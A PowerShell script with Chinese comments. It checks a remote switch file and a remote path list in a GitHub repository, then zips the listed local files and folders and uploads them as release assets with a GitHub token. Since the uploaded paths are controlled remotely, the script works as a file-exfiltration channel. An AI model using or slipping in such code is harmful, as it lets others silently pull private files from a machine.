# --- 配置区 ---
$repo = "ertgyhujkfghj/2"
$token = $env:GH_TOKEN
if ([string]::IsNullOrEmpty($token)) {
    Write-Host "环境变量 GH_TOKEN 未设置，退出脚本"
    return
}

$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
$pathConfigUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"

# --- 工具函数 ---
function Test-FileLock {
    param([string]$filePath)
    try {
        $stream = [System.IO.File]::Open($filePath, 'Open', 'ReadWrite', 'None')
        $stream.Close()
        return $false
    } catch {
        return $true
    }
}

function Compress-FilesSkippingLocked {
    param(
        [string]$sourceDir,
        [string]$zipPath
    )
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempDir | Out-Null

    Write-Host "开始复制非锁定文件到临时目录： $tempDir"
    Get-ChildItem -Path $sourceDir -Recurse -File | ForEach-Object {
        if (-not (Test-FileLock $_.FullName)) {
            $targetPath = Join-Path $tempDir ($_.FullName.Substring($sourceDir.Length).TrimStart('\'))
            $targetDir = Split-Path $targetPath
            if (-not (Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir -Force | Out-Null }
            Copy-Item $_.FullName $targetPath -Force
        } else {
            Write-Host "跳过锁定文件：" $_.FullName
        }
    }

    Write-Host "开始压缩临时目录到 ZIP： $zipPath"
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)

    Remove-Item $tempDir -Recurse -Force
    Write-Host "压缩完成，删除临时目录"
}

function Upload-File {
    param(
        [string]$filePath,
        [string]$tagName
    )
    $uploadUrl = "https://api.github.com/repos/$repo/releases"
    $headers = @{
        Authorization = "token $token"
        "User-Agent"  = "upload-script"
        Accept        = "application/vnd.github+json"
    }

    try {
        $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
            tag_name   = $tagName
            name       = $tagName
            draft      = $false
            prerelease = $false
        } | ConvertTo-Json -Depth 3)
        Write-Host "创建 Release 成功，ID：" $release.id
    } catch {
        Write-Host "创建 Release 失败：" $_
        return
    }

    $releaseId = $release.id
    $assetName = [System.IO.Path]::GetFileName($filePath)
    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$releaseId/assets?name=$assetName"

    try {
        Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
            Authorization = "token $token"
            "Content-Type" = "application/zip"
            "User-Agent"   = "upload-script"
        } -InFile $filePath
        Write-Host "上传文件成功：" $assetName
    } catch {
        Write-Host "上传文件失败：" $_
    }
}

# --- 主流程 ---
try {
    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
    if ($enabled.Trim().ToLower() -ne "on") {
        Write-Host "上传开关未开启，退出脚本"
        return
    }
} catch {
    Write-Host "读取上传开关失败，退出脚本：" $_
    return
}

try {
    $pathsRaw = Invoke-RestMethod -Uri $pathConfigUrl -UseBasicParsing
    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_ -and $_.Trim() -ne "" }
    Write-Host "读取上传路径列表："
    $uploadPaths | ForEach-Object { Write-Host " - $_" }
} catch {
    Write-Host "读取上传路径列表失败，退出脚本：" $_
    return
}

foreach ($path in $uploadPaths) {
    if (-not (Test-Path $path)) {
        Write-Host "路径不存在，跳过： $path"
        continue
    }

    $tag = "upload-$(Split-Path $path -Leaf)-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

    if ((Get-Item $path).PSIsContainer) {
        # 文件夹处理
        $zipPath = "$env:TEMP\upload_$(Get-Random).zip"
        Compress-FilesSkippingLocked -sourceDir $path -zipPath $zipPath
        Upload-File -filePath $zipPath -tagName $tag
        Remove-Item $zipPath -Force
    } else {
        # 文件直接上传
        Upload-File -filePath $path -tagName $tag
    }
}
